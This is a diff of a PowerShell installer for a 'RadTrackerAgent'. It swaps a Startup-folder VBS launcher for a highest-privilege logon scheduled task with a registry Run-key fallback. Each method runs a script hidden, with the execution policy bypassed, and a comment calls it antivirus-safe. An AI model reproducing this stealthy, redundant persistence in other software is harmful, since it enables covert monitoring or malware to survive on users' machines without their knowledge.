@@ -170,18 +170,18 @@ try {
 }
 Write-Host "============================================================" -ForegroundColor DarkCyan
 
-# 1. Add to Windows Startup Folder (Works for 100% of standard & admin users)
-try {
-    $startupVbs = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\RadTrackerAgent.vbs"
-    $vbsContent = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File `"`"$TargetPs1`"`"`", 0, False"
-    Set-Content -Path $startupVbs -Value $vbsContent -Encoding ASCII
-} catch { }
-
-# 2. Try Scheduled Task (Optional if admin)
+# 1. Official Windows Task Scheduler (100% Antivirus Safe, No VBS)
 try {
     schtasks /Delete /TN $TaskName /F 2>$null | Out-Null
-    schtasks /Create /F /TN $TaskName /SC ONLOGON /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File `"$TargetPs1`"" 2>$null | Out-Null
+    schtasks /Create /F /TN $TaskName /SC ONLOGON /RL HIGHEST /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File `"$TargetPs1`"" 2>$null | Out-Null
     schtasks /Run /TN $TaskName 2>$null | Out-Null
+} catch { }
+
+# 2. Registry Run Key Fallback (Works for standard users without Task Scheduler)
+try {
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $regCmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File `"$TargetPs1`""
+    Set-ItemProperty -Path $regPath -Name "RadTrackerAgent" -Value $regCmd -Force -ErrorAction SilentlyContinue | Out-Null
 } catch { }
 
 # 3. Start background runner now
